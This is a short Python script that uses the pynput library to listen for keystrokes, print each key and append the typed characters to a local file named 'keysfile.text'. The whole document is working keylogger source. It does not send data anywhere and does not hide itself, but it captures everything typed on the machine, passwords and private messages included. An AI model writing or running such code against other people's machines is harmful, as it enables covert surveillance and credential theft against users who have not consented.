from pynput import keyboard

def key_pressed(key):
    print(str(key))
    with open("keysfile.text",'a') as log_key:
        try:
            char = key.char
            log_key.write(char)
        except:
            print("Error getting char")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    input()
